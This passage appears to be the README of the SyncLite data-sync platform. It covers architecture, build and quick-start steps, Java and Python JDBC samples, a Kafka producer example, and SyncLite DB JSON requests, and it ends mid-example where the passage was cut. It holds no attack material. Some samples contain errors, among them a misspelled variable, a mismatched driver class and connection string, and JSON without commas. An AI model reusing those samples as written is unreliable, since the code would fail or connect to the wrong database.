```SyncLite DB```, a standalone sync-enabled database, accepting SQL requests in JSON format over HTTP, making it compatible with any programming language (Java, Python, C++, C#, Go, Rust, Ruby, Node.js etc.) and ideal for flexible, real-time data integration and consolidation, right from edge/desktop applications into final data destinations.
```

{Edge/Desktop Apps} + {SyncLite Logger + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Edge/Desktop Apps} ---> {SyncLite DB + Embedded Databases} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: 

https://www.synclite.io/synclite/sync-ready-apps

https://www.synclite.io/solutions/gen-ai-search-rag


## Build Streaming Applications For Last Mile Delivery: 
SyncLite facilitates development of large-scale data streaming applications through SyncLite Logger, which offers both a Kafka Producer API and SQL API. This allows for the ingestion of massive amounts of data and provides the capability to query the ingested data using the SQL API within applications. Together, SyncLite Logger and SyncLite Consolidator enable seamless last-mile data integration from thousands of streaming application instances into a diverse array of final data destinations.

```
{Data Streaming Apps} + {SyncLite Logger} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

```
{Data Streaming Apps} ---> {SyncLite DB} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn more: https://www.synclite.io/synclite/last-mile-streaming


## Deploy Database ETL/Replication/Migration Pipelines:
Set up many-to-many, scalable database replication/migration/incremental ETL pipelines from a diverse range of source databases and raw data files into a diverse range of destinations.

```
{Source Databases} ---> {SyncLite DBReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/smart-database-etl

## Setup Rapid IoT Data Connectors:
Connect numerous MQTT brokers (IoT gateways) to one or more destination databases.

```
{IoT Message Brokers} ---> {SyncLite QReader} ---> {Staging Storage} ---> {SyncLite Consolidator} ---> {Destination DB/DW/DataLakes}
```

Learn More: https://www.synclite.io/solutions/iot-data-connector

# SyncLite Components

```SyncLite Logger``` is a JDBC driver, enables developers to rapidly build 
	
-sync-enabled, robust, responsive, high-performance, low-latency, transactional, data intensive applications for edge/mobile/desktop platforms using their favorite embedded databases (SQLite, DuckDB, Apache Derby, H2, HyperSQL)
  	
-large scale data streaming solutions for last mile data integrations into a wide range of industry leading databases, while offering ability to perform real-time analytics using the native embedded databases over streaming data, at the producer end of the pipelines.

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable SyncLite Logger library for Java and Python applications, SyncLite DB acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send SQL requests (wrapped in JSON format) over HTTP. 

```SyncLite Client``` is a command line tool to operate SyncLite devices, to execute SQL queries and workloads.

```SyncLite DBReader``` enables data teams and data engineers to configure and orchestrate many-to-many, highly scalable, incremental/log-based database ETL/replication/migration jobs across a diverse array of databases, data warehouses and data lakes.

```SyncLite QReader``` enables developers to integrate IoT data published to message queue brokers, into a diverse array of databases, data warehouses and data lakes, enabling real-time analytics and AI use cases at all three levels: edge, fog and cloud.

```SyncLite Consolidator``` is the centralized application to all the reader/producer tools mentioned above, which receives and consolidates the incoming data and log files in real-time into one or more databases, data warehouses and data lakes of user’s choice. SyncLite Consolidator also offers additional features: table/column/value filtering and mapping, data type mapping, database trigger installation, fine-tunable writes, support for multiple destinations and more.

```SyncLite JobMonitor``` enables managing, scheduling and monitoring all SyncLite jobs created on a given host.

```SyncLite Validator``` is an E2E integration testing tool for SyncLite.

# Build SyncLite

1. If you are using a pre-built release then ignore this section. 
2. Install/Download Apache Maven(3.8.6 or above): https://maven.apache.org/download.cgi
3. If you opt to not use the deploy scripts generated in the release which download the prerequisite software : Apache Tomcat and OpenJDK, then manually install them
	
 	a. OpenJDK 11 : https://jdk.java.net/java-se-ri/11
	
 	b. Apache Tomcat 9.0.95 : https://tomcat.apache.org/download-90.cgi

5. Run following: 
	```
	git clone --recurse-submodules git@github.com:syncliteio/SyncLite.git SyncLite
	
	cd SyncLite
	
	mvn -Drevision=oss clean install
	
	```
6. Release is created under SyncLite/target

## Release Structure:

The build process creates following release structure under SyncLite\target: 
```
synclite-platform-<version>
|
|
--------lib
|       |
|       |
|        --------logger
|       |        |
|       |        |
|       |        --------java
|       |        |        |
|       |        |        |    
|       |        |        --------synclite-logger-<version>.jar   ==> SyncLite Logger JDBC driver, to be added as a depependency in your edge apps
|       |        |
|       |        |
|       |        --------synclite_logger.conf  ==> A sample configuration file for SyncLite logger.
|       |
|       |
|       --------consolidator
|       |        |
|       |        |
|       |        --------synclite-consolidator-<version>.war   ==> SyncLite Consolidator application, to be deployed on an application server such as Tomcat on a centralized host
|
|
|
|
--------sample-apps
|        |
|        |
|        --------jsp-servlet
|        |        |
|        |        |
|        |        --------web
|        |        |
|        |        |
|        |        --------src          ==> Source code of a sample Jsp Servlet app that demonstrates usage of synclite-logger
|        |        |
|        |        |
|        |        --------target        
|        |        |
|        |        |
|        |        --------synclite-sample-app-<version>.war
|        |        
|        |
|        --------java
|        |        |
|        |        |
|        |        --------*.java    => Java source files demonstrating SyncLite logger usage.
|        |        |
|        |        |
|        |        --------README
|        |
|        |
|        |
|        |
|        --------python
|                |
|                |
|                --------*.py    => Python source files demonstrating SyncLite logger usage.
|                |
|                |
|                --------README
|
|
|
|
--------bin
|        |
|        |
|        --------deploy.bat/deploy.sh    ==> Deployment script for deploying SyncLite consolidator and sample application from the lib directory
|        |                    
|        |                        
|        --------start.bat/start.sh    ==> Launch script to start tomcat and the deployed SyncLite applications.
|        |             
|        |           
|        --------docker-deploy.sh/docker-start.sh   ==> Deployment and launch scripts for running SyncLite Consolidator inside a docker container. 
|        |             
|        |           
|        --------stage
|        |        |         
|        |        |         
|        |        --------sftp    ==> Contains docker-deploy.sh,docker-start.sh, docker-stop.sh scripts to launch SFTP server as SyncLite stage
|        |        |         
|        |        |                                   
|        |        --------minio   ==> Contains docker-deploy.sh, docker-start.sh, docker-stop.sh scripts to launch MinIO server as SyncLite stage
|        |       
|        |       
|        |       
|        --------dst
|                |
|                |                
|                --------postgresql  ==> Contains docker-deploy.sh,docker-start.sh scripts to launch PostgrSQL server as SyncLite destination DB
|                |         
|                |                                  
|                --------mysql   ==> Contains docker-deploy.sh, docker-start.shscripts to launch MySQL server as SyncLite destination DB
| 
|
|
--------tools
        |
        |
        --------synclite-client   ==> Client tool to execute SQL operations on SyncLite databases/devices.
	|
	|
        --------synclite-db    ==> A standalone database server offering sync-enabled embedded databases for edge/desktop applications. 
	|
	|
        --------synclite-dbreader    ==> Smart database ETL/Replication/Migration tool
	|
	|
	--------synclite-qreader     ==> Rapid IoT data connector tool
	|
	|
	--------synclite-job-monitor   ==> Job Monitor tool to manage, monitor and schedule SyncLite jobs.
	|
	|
        --------synclite-validator    ==> An E2E integration testing tool for SyncLite
 

```

### Quick Start - Native/Docker based

NOTE: Below instructions enable a quick start and trial of SyncLite platform. 
For production usage, it is recommended to go through installation process to install OpenJDK11 and Tomcat9 (as a service) 
on your Windows/Ubuntu host.

1. Enter bin directory.

2. (One time) Run ```deploy.bat```(WINDOWS) / ```deploy.sh``` (UBUNTU) to deploy the SyncLite consolidator and a SyncLite sample application.
   
   OR Run ```docker-deploy.sh``` (UBUNTU) to deploy a docker container for SyncLite platform.

   OR Manually deploy below war files on your tomcat server:
   - ```SyncLite\target\synclite-platform-dev\lib\consolidator\synclite-consolidator-oss.war```,
   - ```SyncLite\target\synclite-platform-dev\sample-apps\jsp-servlet\web\target\synclite-sample-app-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-dbreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-qreader-oss.war```
   - ```SyncLite\target\synclite-platform-dev\tools\synclite-dbreader\synclite-jobmonitor-oss.war```
     
   
3. Run ```start.bat```(WINDOWS) / ```start.sh```(UBUNTU) to start tomcat and the deployed SyncLite applications. (Please note the username/password for tomcat manager web console is synclite/synclite)

   OR Run ```docker-start.sh``` to run the docker container (Please check options passed to docker run command e.g. the home directory of the current user is mapped to ```/root``` inside docker to persist all the
   SyncLite storage in the native host).

   OR manually start applications from your tomcat manager console.

4. Open tomcat manager console http://localhost:8080/manager (Use synclite/synclite as the default user/password when prompted as set by the deploy script). The manager web console will show all the SyncLite applications deployed. 

5. Open http://localhost:8080/synclite-consolidator to launch SyncLite Consolidator application

6. Open http://localhost:8080/synclite-sample-app to launch SyncLite sample web application 

7. Configure and start SyncLite consolidator job in the SyncLite Consolidator application. You can follow through the ""Configure Job"" wizard reviewing all the default configuration values. Create databases/devices of any type from the deployed sample web application and execute SQL workloads on several devices at once specifying the device index range. Observe data consolidator in the SyncLite Cosolidator dashboard. You can check device specific data consolidation progress on individual device pages (from ""List Devices"" page), query destination database on the ""Analyze Data"" page. 

8. This release also comes with a CLI client for SyncLite under tools/synclite-client. You can run synclite-client.bat(WINDOWS)/synclite-client.sh (UBUNTU) to start the client tool and execute SQL operations which are not only executed/persisted on the native database but also consolidated by the SyncLite consolidator into destination DB.
   - Usage 1 : ```synclite-client.bat/synclite-client.sh ==> Will start with DB = <USER.HOME>/synclite/job1/db/test.db, DEVICE_TYPE = SQLITE, CONFIG = <USER.HOME>/synclite/db/synclite_logger.conf```
   - Usage 2 : ```synclite-client.bat/synclite-client.sh <path/to/db/file> --device-type <SQLITE|DUCKDB|DERBY|H2|HYPERSQL|STREAMING|SQLITE_APPENDER|DUCKDB_APPENDER|DERBY_APPENDER|H2_APPENDER|HYPERSQL_APPENDER> --synclite-logger-config <path/to/synclite/logger/config> --server <SyncLite DB Address>```
   - Note: If --sever switch is specified then the client connects to SyncLite DB to  execute SQL statements, else it usages embedded ```SyncLite Logger``` library to directly operate on the devices.
     
9. This release also comes with SyncLite DB server under tools/synclite-db. You can run synclite-db.bat(WINDOWS)/synclite-db.sh(UBUNTU) to start SyncLite DB server and connect to it using synclite-client to execute SQL operations which are not only executed/persisted on the specified embedded database but also consolidated by the SyncLite Consolidator onto the destination databases.
   - Usage 1 : ```synclite-db.bat/synclite-db.sh``` ==> Will start SyncLite DB with default configurations
   - Usage 2 : ```synclite-db.bat/synclite-db.sh --config <path/to/synclite-db/config>```
          
10. Use ```stop.bat``` (Windows) / ```stop.sh```(LINUX) to stop SyncLite consolidator job (if running) and tomcat.
   OR RUN docker-stop.sh to stop the docker container.

11. Refer ```sample_apps/java``` and ```samples_apps/python``` and use any of them as a starting point to build your own application.

12. You can install/use a database of your choice and  perform data consolidation to it (instead of the default SQLite destination): PostgreSQL, MySQL, MongoDB, SQLite, DuckDB.

13. This release also packages docker scripts to setup PostgreSQL and MySQL to serve as SyncLite destinations.
    - ```bin/dst/postgresql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/dst/mysql``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker.stop.sh```

14. You can deploy your applications on remote hosts/devices and share the local-stage-directory of your respective SyncLite applications with SyncLite Consolidator host via one of the following file staging storages: 
    - SFTP
    - Amazon S3
    - MinIO Object Storage Server
    - Apache Kafka
    - Microsoft OneDrive
    - Google Drive
    - NFS Sharing
    - Local Network Sharing
      
Please check documentation for setting up these staging storages for SyncLite : https://www.synclite.io/resources/documentation
 
15. This release also packages docker scripts to setup SFTP and MinIO servers to serve as SyncLite stage.
    - ```bin/stage/sftp```  contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
    - ```bin/stage/minio``` contains ```docker-deploy.sh```, ```docker-start.sh``` and ```docker-stop.sh```
      NOTE: These scripts contain default configurations. You must change usernames, passwords and setup any additional security mechanisms on top of these basic setups. 

16. The SyncLite docker scripts ```bin/docker-deploy.sh```, ```bin/docker-start.sh```, ```bin/docker-stop.sh``` contain two variables at the top to choose a stage and destination:
    - STAGE : Set it to SFTP or MINIO.
    - DST : Set it to POSTGRESQL or MYSQL.

      Once you set the STAGE and DST to appropriate values e.g. SFTP and POSTGRESQL, the ```docker-deploy.sh``` and ```docker-start.sh``` scripts will bring up docker containers for SyncLite consolidator, SFTP
      server and PostgreSQL server and you will be all set to configure and start a SyncLite consoldiator job be able to consolidate data into PostgreSQL server received from remote SyncLite applications
      configured to connect to the SFTP stage. 

17. After a successful trial, if you need to perform another trial, stop the docker containers, and delete contents under ```/home/synclite``` to start a fresh trial of a different scenario etc.

18. Open http://localhost:8080/synclite-dbreader (and open http://localhost:8080/synclite-consolidator) to setup database ETL/Replication/Migration pipelines.

19. Open http://localhost:8080/synclite-qreader (and open http://localhost:8080/synclite-consolidator) to setup rapid IoT pipelines.

20. Open http://localhost:8080/synclite-job-monitor to manage, monitor and schedule various SyncLite jobs.
    
Refer documentation at https://www.synclite.io/resources/documentation for more details.

NOTE : For production usage, it is recommended to install OpenJDK11 and Tomcat as a service (or any other application server of your choice) and deploy SyncLite consolidator web archive release, Please refer our documentation at www.synclite.io for detailed installation steps for Windows and Ubuntu.


# Using SyncLite Logger

Add ```synclite-logger-<version>.jar``` file created as part of the above build as a dependency in your application.

## Configuration File

Refer ```src/main/resources/synclite_logger.conf``` file for all available configuration options for SyncLite Logger. Refer ""SyncLite Logger Configuration"" section in the documentation at https://www.synclite.io/resources/documentation for more details about all configuration options. 

## Application Code Samples (SQL API)

Refer below code samples to build applications using SyncLite Logger. 

### Transactional Devices : 

Transactional devices (SQLite, DuckDB, Apache Derby, H2, HyperSQL) support all database operations and perform transactional logging of all the DDL and DML operations performed by the application. These enable  developers to build use cases such as building data-intensive sync-ready applications for edge, edge + cloud GenAI search and RAG applications, native SQL (hot) hot data stores, SQL application caches, edge enablement of cloud databases and more.

#### Java
```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;


public class TestTransactionalDevice {
	
	public static Path syncLiteDBPath;
	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLite"");
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDB"");
		//Apache Derby : Class.forName(""io.synclite.logger.Derby"");
		//H2 : Class.forName(""io.synclite.logger.H2"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQL"");
		//////////////////////////////////////////////////////
		//

		Path dbPath = syncLiteDBPath.resolve(""test_tran.db"");
		SQLite.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//
		//////////////////////////////////////////////////////
		//For other types of transactional devices : 
		//DuckDB : DuckDB.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//Apache Derby : Derby.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//H2 : H2.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//HyperSQL : HyperSQL.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
		//////////////////////////////////////////////////////
		//
	}	
	
	public void myAppBusinessLogic() throws SQLException {
		//
		//Some application business logic
		//
		//Perform some database operations		
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite:"" + syncLiteDBPath.resolve(""test_sqlite.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of transactional devices use following connection strings :
			//For DuckDB : jdbc:synclite_duckdb:<db_path>
			//For Apache Derby : jdbc:synclite_derby:<db_path>
			//For H2 : jdbc:synclite_h2:<db_path>
			//For HyperSQL : jdbc:synclite_hsqldb:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) { 
				//Example of executing a DDL : CREATE TABLE. 
				//You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
				
				//Example of performing INSERT
				stmt.execute(""INSERT INTO feedback VALUES(3, 'Good product')"");				
			}
			
			//Example of setting Auto commit OFF to implement transactional semantics
			conn.setAutoCommit(false);
			try (Statement stmt = conn.createStatement()) { 
				//Example of performing basic DML operations INSERT/UPDATE/DELETE
				stmt.execute(""UPDATE feedback SET comment = 'Better product' WHERE rating = 3"");
				stmt.execute(""INSERT INTO feedback VALUES (1, 'Poor product')"");
				stmt.execute(""DELETE FROM feedback WHERE rating = 1"");
			}
			conn.commit();
			conn.setAutoCommit(true);
			
			//Example of Prepared Statement functionality for bulk insert.			
			try(PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();
				
				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();
				
				pstmt.executeBatch();			
			}
		}
		//Close SyncLite database/device cleanly.
		SQLite.closeDevice(Path.of(""test_sqlite.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of transactional devices :
		//DuckDB : DuckDB.closeDevice
		//Apache Derby : Derby.closeDevice
		//H2 : H2.closeDevice
		//HyperSQL : HyperSQL.closeDevice
		//////////////////////////////////////////////////////
		//
		//You can also close all open databases in a single SQL : CLOSE ALL DATABASES
	}	
	
	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestTransactionalDevice testApp = new TestTransactionalDevice();
		testApp.myAppBusinessLogic();
	}
}

```
#### Python   

```
import jaydebeapi

props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""tran1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLite"",
                           ""jdbc:synclite_duckdb:c:\\synclite\\python\\data\\test_sqlite.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of transactional devices use following are the class names and connection strings :
#For DuckDB - Class : io.synclite.logger.DuckDB, Connection String : jdbc:synclite_duckdb:<db_path>
#For Apache Derby - Class : io.synclite.logger.Derby, Connection String : jdbc:synclite_derby:<db_path>
#For H2 - Class : io.synclite.logger.H2, Connection String : jdbc:synclite_h2:<db_path>
#For HyperSQL - Class : io.synclite.logger.HyperSQL, Connection String : jdbc:synclite_hsqldb:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of performing basic DML operations INSERT/UPDATE/DELETE
curs.execute(""insert into feedback values (3, 'Good product')"")

#Example of setting Auto commit OFF to implement transactional semantics
conn.jconn.setAutoCommit(False)
curs.execute(""update feedback set comment = 'Better product' where rating = 3"")
curs.execute(""insert into feedback values (1, 'Poor product')"")
curs.execute(""delete from feedback where rating = 1"")
conn.commit()
conn.jconn.setAutoCommit(True)


#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_sqlite.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Appender Devices :

Appender devices (SQLiteAppender, DuckDBAppender, DerbyAppender, H2Appender, HyperSQLAppender) support all DDL operations and Prepared Statement based INSERT operations, are highly optimized for high speed concurrent batched data ingestion, performing logging of ingested data. Unlike transactional devices, appender devices only allow INSERT DML operations (UPDATE and DELETE are not allowed). Appender devices enable developers to build high volume streaming applications enabled with last mile data integration from thousands of edge points into centralized database destinations as well as in-app analytics by enabling fast read access to ingested data from the underlying local embedded databases storing the ingested/streamed data.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestAppenderDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.SQLiteAppender"");
		//
		//////////////////////////////////////////////////////
		//For other types of appender devices : 
		//DuckDB : Class.forName(""io.synclite.logger.DuckDBAppender"");
		//Apache Derby : Class.forName(""io.synclite.logger.DerbyAppender"");
		//H2 : Class.forName(""io.synclite.logger.H2Appender"");
		//HyperSQL : Class.forName(""io.synclite.logger.HyperSQLAppender"");
		//////////////////////////////////////////////////////
		//
		Path dbPath = syncLiteDBPath.resolve(""test_appender.db"");
		SQLiteAppender.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager.getConnection(""jdbc:synclite_sqlite_appender:"" + syncLiteDBPath.resolve(""test_appender.db""))) {
			//
		        //////////////////////////////////////////////////////////////////
			//For other types of appender devices use following connection strings :
			//For DuckDBAppender : jdbc:synclite_duckdb_appender:<db_path>
			//For DerbyAppender : jdbc:synclite_derby_appender:<db_path>
			//For H2Appender : jdbc:synclite_h2_appender:<db_path>
			//For HyperSQLAppender : jdbc:synclite_hsqldb_appender:<db_path>
			///////////////////////////////////////////////////////////////////
			//
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			//
			// Example of Prepared Statement functionality for bulk insert.
			// Note that Appender Devices allows all DDL operations, INSERT INTO DML operations (UPDATES and DELETES are not allowed) and SELECT queries.
			//
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		SQLiteAppender.closeDevice(Path.of(""test_appender.db""));
		//
		///////////////////////////////////////////////////////
		//For other types of appender devices :
		//DuckDBAppender : DuckDBAppender.closeDevice
		//DerbyAppender : DerbyAppender.closeDevice
		//H2Appender : H2Appender.closeDevice
		//HyperSQLAppender : HyperSQLAppender.closeDevice
		//////////////////////////////////////////////////////
		//
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestAppenderDevice testApp = new TestAppenderDevice();
		testApp.myAppBusinessLogic();
	}

}
```

#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""appender1""
}
conn = jaydebeapi.connect(""io.synclite.logger.SQLiteAppender"",
                           ""jdbc:synclite_sqlite_appender:c:\\synclite\\python\\data\\test_appender.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)
#//
#////////////////////////////////////////////////////////////////
#For other types of appender devices use following are the class names and connection strings :
#For DuckDBAppender - Class : io.synclite.logger.DuckDBAppender, Connection String : jdbc:synclite_duckdb_appender:<db_path>
#For DerbyAppender - Class : io.synclite.logger.DerbyAppender, Connection String : jdbc:synclite_derby_appender:<db_path>
#For H2Appender - Class : io.synclite.logger.H2Appender, Connection String : jdbc:synclite_h2_appender:<db_path>
#For HyperSQLAppender - Class : io.synclite.logger.HyperSQLAppender, Connection String : jdbc:synclite_hsqldb_appender:<db_path>
#/////////////////////////////////////////////////////////////////
#//

curs = conn.cursor()

#Example of executing a DDL : CREATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\test_appender.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

### Streaming Device : 
Streaming device allows all DDL operations (as supported by SQLite) and Prepared Statement based INSERT operations (UPDATE and DELETE are not allowed) to allow high speed concurrent batched data ingestion, performing logging and streaming of the ingested data. Streaming device enable developers to build high volume data streaming applications enabled with last mile data integration from thousands of edge applications into one or more centralized databases/data warehouses/data lakes.

#### Java

```
package testApp;

import java.nio.file.Path;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.sql.Statement;
import io.synclite.logger.*;

public class TestStreamingDevice {
	public static Path syncLiteDBPath;

	public static void appStartup() throws SQLException, ClassNotFoundException {
		syncLiteDBPath = Path.of(System.getProperty(""user.home""), ""synclite"", ""db"");
		Class.forName(""io.synclite.logger.Streaming"");
		Path dbPath = syncLiteDBPath.resolve(""t_str.db"");
		Streaming.initialize(dbPath, syncLiteDBPath.resolve(""synclite_logger.conf""));
	}

	public void myAppBusinessLogic() throws SQLException {
		//
		// Some application business logic
		//
		// Perform some database operations
		try (Connection conn = DriverManager
				.getConnection(""jdbc:synclite_streaming:"" + syncLiteDBPath.resolve(""t_str.db""))) {
			try (Statement stmt = conn.createStatement()) {
				// Example of executing a DDL : CREATE TABLE.
				// You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
				stmt.execute(""CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)"");
			}

			// Example of Prepared Statement functionality for bulk insert.
			try (PreparedStatement pstmt = conn.prepareStatement(""INSERT INTO feedback VALUES(?, ?)"")) {
				pstmt.setInt(1, 4);
				pstmt.setString(2, ""Excellent Product"");
				pstmt.addBatch();

				pstmt.setInt(1, 5);
				pstmt.setString(2, ""Outstanding Product"");
				pstmt.addBatch();

				pstmt.executeBatch();
			}
		}
		// Close SyncLite database/device cleanly.
		Streaming.closeDevice(Path.of(""t_str.db""));
		// You can also close all open databases/devices in a single SQL : CLOSE ALL
		// DATABASES
	}

	public static void main(String[] args) throws ClassNotFoundException, SQLException {
		appStartup();
		TestStreamingDevice testApp = new TestStreamingDevice();
		testApp.myAppBusinessLogic();
	}
}
```
#### Python

```
import jaydebeapi
props = {
  ""config"": ""synclite_logger.conf"",
  ""device-name"" : ""streaming1""
}
conn = jaydebeapi.connect(""io.synclite.logger.Streaming"",
                           ""jdbc:synclite_streaming:c:\\synclite\\python\\data\\t_str.db"",
                           props,
                           ""synclite-logger-<version>.jar"",)

curs = conn.cursor()

#Example of executing a DDL : CEATE TABLE.
#You can execute other DDL operations : DROP TABLE, ALTER TABLE, RENAME TABLE.
curs.execute('CREATE TABLE IF NOT EXISTS feedback(rating INT, comment TEXT)')

#Example of Prepared Statement functionality for bulk insert.
args = [[4, 'Excellent product'],[5, 'Outstanding product']]
curs.executemany(""insert into feedback values (?, ?)"", args)

#Close SyncLite database/device cleanly.
curs.execute(""close database c:\\synclite\\python\\data\\t_str.db"");

#You can also close all open databases in a single SQL : CLOSE ALL DATABASES
```

## Application Code Samples (Kafka API)

```
package testApp;

import io.synclite.logger.*;

public class TestKafkaProducer {

	public static void main(String[] args) throws Exception {

		Properties props = new Properties();
	    
		//
		//Set properties to use a staging storage of your choice e.g. S3, MinIO, SFTP etc. 
		//where SyncLite logger will ship log files continuously for consumption by SyncLite consolidator
		//
		
        	Producer<String, String> producer = new io.synclite.logger.KafkaProducer(props);

		ProducerRecord<String, String> record = new ProducerRecord<>(""test"", ""key"", ""value"");
        
		//
		//You can use same or different KafkaProducer objects to ingest data concurrently over multiple theads.
		//
        	producer.send(record);
		
		produer.close();

	}
```

# Launching and using SyncLite DB

```SyncLite DB``` is a sync-enabled, single-node database server that wraps popular embedded databases like SQLite, DuckDB, Apache Derby, H2, and HyperSQL. Unlike the embeddable ```SyncLite Logger``` library for Java and Python applications, ```SyncLite DB``` acts as a standalone server, allowing your edge or desktop applications—regardless of the programming language—to connect and send/post SQL requests (wrapped in JSON format) via a REST API. This makes it an ideal solution for seamless, real-time data synchronization in diverse environments.

1. Go to the directory ```synclite-platform-<version>\tools\synclite-db```
2. Check the configurations in synclite-db.conf and adjust them as per your needs.
3. Run ```synclite-db.bat --config synclite-db.conf``` ( OR ```synclite-db.sh --config synclite-db.conf``` on linux). This starts the SyncLite DB server listening at the specified address.
4. An application in your favoirite programming language can establish a connection with the SyncLite DB server at the specified address and send requests in JSON format as below

	- Connect and initialize a device

   	Request
	```
 	{
 		""db-type"" : ""SQLITE""
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""synclite-logger-config"" : ""C:\synclite\users\bob\synclite\job1\synclite_logger.conf""
 		""sql"" : ""initialize""
 	}
  	```

 	Response from Server 
 	```
  	{
  		""result""  : true	
 		""message"" : ""Database initialized successfully""
 	}
  	```
  
	- Send a sql command to create a table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""CREATE TABLE IF NOT EXISTS(a INT, b INT)""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Update executed successfully, rows affected: 0""
   	}
  	```
  
	- Send a request to perform a batched insert in the created table

   	Request
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""INSERT INTO t1(a,b) VALUES(?, ?)""
 		""arguments"" : [[1, ""one""], [2, ""two""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
